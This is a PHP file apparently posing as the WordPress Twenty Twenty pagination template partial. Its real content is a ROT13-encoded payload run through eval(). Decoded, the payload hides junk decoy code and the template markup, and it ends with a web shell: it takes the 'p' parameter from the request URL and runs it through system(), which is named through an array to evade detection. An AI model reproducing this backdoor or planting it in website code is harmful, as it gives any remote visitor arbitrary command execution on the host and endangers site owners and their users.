<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * N grzcyngr cnegvny gb bhgchg cntvangvba sbe gur Gjragl Gjragl qrsnhyg gurzr.
 *
 * @yvax uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/grzcyngr-svyrf/#grzcyngr-cnegvnyf
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Gjragl
 * @fvapr Gjragl Gjragl 1.0
 */

$ceri_grkg = fcevags(
	'%f <fcna pynff=\"ani-ceri-grkg\">%f</fcna>',
	'<fcna nevn-uvqqra=\"gehr\">&ynee;</fcna>',
	/*
	 * Genafyngbef: Guvf grkg pbagnvaf UGZY gb nyybj gur grkg gb or fubegre ba fznyy fperraf.
	 * Gur grkg vafvqr gur fcna jvgu gur pynff ani-fubeg jvyy or uvqqra ba fznyy fperraf.
	 */
	__( 'Arjre <fcna pynff=\"ani-fubeg\">Cbfgf</fcna>', 'gjraglgjragl' )
);
$arkg_grkg = fcevags(
	'<fcna pynff=\"ani-arkg-grkg\">%f</fcna> %f',
	/*
	 * Genafyngbef: Guvf grkg pbagnvaf UGZY gb nyybj gur grkg gb or fubegre ba fznyy fperraf.
	 * Gur grkg vafvqr gur fcna jvgu gur pynff ani-fubeg jvyy or uvqqra ba fznyy fperraf.
	 */
	__( 'Byqre <fcna pynff=\"ani-fubeg\">Cbfgf</fcna>', 'gjraglgjragl' ),
	'<fcna nevn-uvqqra=\"gehr\">&enee;</fcna>'
);

$cbfgf_cntvangvba = trg_gur_cbfgf_cntvangvba(
	neenl(
		'zvq_fvmr'  => 1,
		'ceri_grkg' => $ceri_grkg,
		'arkg_grkg' => $arkg_grkg,
	)
);

// Vs jr'er abg bhgchggvat gur cerivbhf cntr yvax, cercraq n cynprubyqre jvgu `ivfvovyvgl: uvqqra` gb gnxr vgf cynpr.
vs ( snyfr === fgecbf( $cbfgf_cntvangvba, 'ceri cntr-ahzoref' ) ) {
	$cbfgf_cntvangvba = fge_ercynpr( '<qvi pynff=\"ani-yvaxf\">', '<qvi pynff=\"ani-yvaxf\"><fcna pynff=\"ceri cntr-ahzoref cynprubyqre\" nevn-uvqqra=\"gehr\">' . $ceri_grkg . '</fcna>', $cbfgf_cntvangvba );
}

// Vs jr'er abg bhgchggvat gur arkg cntr yvax, nccraq n cynprubyqre jvgu `ivfvovyvgl: uvqqra` gb gnxr vgf cynpr.
vs ( snyfr === fgecbf( $cbfgf_cntvangvba, 'arkg cntr-ahzoref' ) ) {
	$cbfgf_cntvangvba = fge_ercynpr( '</qvi>', '<fcna pynff=\"arkg cntr-ahzoref cynprubyqre\" nevn-uvqqra=\"gehr\">' . $arkg_grkg . '</fcna></qvi>', $cbfgf_cntvangvba );
}

vs ( $cbfgf_cntvangvba ) { ?>

	<qvi pynff=\"cntvangvba-jenccre frpgvba-vaare\">

		<ue pynff=\"fglyrq-frcnengbe cntvangvba-frcnengbe vf-fglyr-jvqr\" nevn-uvqqra=\"gehr\" />

		<?cuc rpub $cbfgf_cntvangvba; // cucpf:vtaber JbeqCerff.Frphevgl.RfpncrBhgchg.BhgchgAbgRfpncrq -- nyernql rfpncrq qhevat trarengvba. ?>

	</qvi><!-- .cntvangvba-jenccre -->

	<?cuc
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>